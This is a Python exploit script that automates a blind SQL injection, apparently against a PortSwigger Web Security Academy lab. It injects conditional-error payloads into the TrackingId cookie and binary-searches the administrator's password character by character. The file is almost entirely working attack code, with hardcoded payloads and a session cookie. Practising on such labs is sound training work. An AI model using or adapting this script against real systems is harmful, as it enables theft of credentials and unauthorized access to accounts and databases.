import sys

from colorama import Fore, Style

from src.binary_search import * 
from src.info_message import welcome_message
from src.sql_function import sending_payload_for_boolean_based_SQLi
from src.info_message import output_message, warning_message, successful_message



def get_password_with_boolean_based_SQLi():

    welcome_message()
        
    #Initialisation of variable
    indice = 1 #use to change the indice of the password 
    result = [] #list all the found character 
    success = True 
    url = "https://0a950065035822a080f5490b008500f1.web-security-academy.net/"

    while indice <= 20: #we assume that the password have 20 character
        if success: #initialisation of all variable used during the process
            liste = ['0','1','2','3','4','5','6','7','8','9','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']    
            low_bound = 0
            high_bound = 36
            mid_point = 18
            operator1 = '>'
            operator2 = '='
            payload_parameter1 = f"{operator1}'{liste[mid_point]}'"
            payload_parameter2 = f"{operator2}'{liste[mid_point]}'"
            success = False

        while low_bound <= high_bound:
            bad_sql1 = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){payload_parameter1} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            bad_sql2 = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){payload_parameter2} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            cookies1 = {
                    'TrackingId': f"FjnUhyE6zvbng0Yo{bad_sql1}",
                    'session': 'WEHBusCNkrJ8JPZdc7RSW3sFD4iSebxr'
                    }
            cookies2 = {
                    'TrackingId': f"FjnUhyE6zvbng0Yo{bad_sql2}",
                    'session': 'WEHBusCNkrJ8JPZdc7RSW3sFD4iSebxr'
                    }
            output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
            output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
            output_message(f"[++] Index number : {indice}")
            status_code, status_code2= sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice, cookies1, cookies2)
            print(f"Status_code: {status_code}, Status_code2: {status_code2}\n")
            
            if status_code2 != 200:
                success = True
                successful_message(f"Succesfull payload with {payload_parameter2} parameter !!!")
                result.append(liste[mid_point])
                print(Fore.YELLOW + f"Payload result... {''.join(result)}\n\n" + Style.RESET_ALL)                
                indice +=1
                break
            
            high_bound,low_bound,mid_point = BinarySearch.binary_search_coderr(status_code, operator1, high_bound, low_bound, mid_point)     
            mid_point = (low_bound+high_bound)//2
            payload_parameter1 = f"{operator1}'{liste[mid_point]}'"
            payload_parameter2 = f"{operator2}'{liste[mid_point]}'"
                        
        if low_bound > high_bound :
            warning_message("All tests failed :( ")
            break
            
        
        
if __name__=='__main__':
    get_password_with_boolean_based_SQLi()
